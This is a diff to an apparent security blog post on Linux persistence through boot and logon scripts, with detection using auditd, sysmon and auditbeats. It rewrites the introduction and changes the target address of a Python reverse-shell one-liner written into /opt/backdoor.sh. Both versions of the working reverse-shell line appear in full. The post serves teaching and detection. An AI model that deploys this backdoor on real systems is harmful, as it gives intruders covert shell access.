@@ -16,15 +16,13 @@ toc: true
 
 ### Introduction
 
-In this blogpost, we'll be wrapping up the linux persistent series. There would be a bit more techniques discussed and the discussion in some (like rootkits) will be brief due to my lack of experience. I may update this post in the future when I've learned a bit more about them.
+In this blogpost, we'll be discussing some scripts  that attackers can install or modify that will execute on boot or logon. This is special files outside systemd services and timers.
 
 The topics discussed here are the following:
 *   [Boot or Logon Initialization Scripts: RC Scripts](https://attack.mitre.org/techniques/T1037/004/)
 *   [Boot or Logon Initialization Scripts: init.d](https://attack.mitre.org/techniques/T1037/)
 *   [Boot or Logon Initialization Scripts: motd](https://attack.mitre.org/techniques/T1037/)
 *   [Event Triggered Execution: Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/)
-
-
 
 We will give some example commands on how to implement these persistence techinques and how to create alerts using open-source solutions such as auditd, sysmon and auditbeats. 
 
@@ -277,7 +275,7 @@ One example of malicious script can be
 
 ```bash
 cat > /opt/backdoor.sh << EOF
-python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' & disown
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' & disown
 EOF
 chmod +x /opt/backdoor.sh
 ```
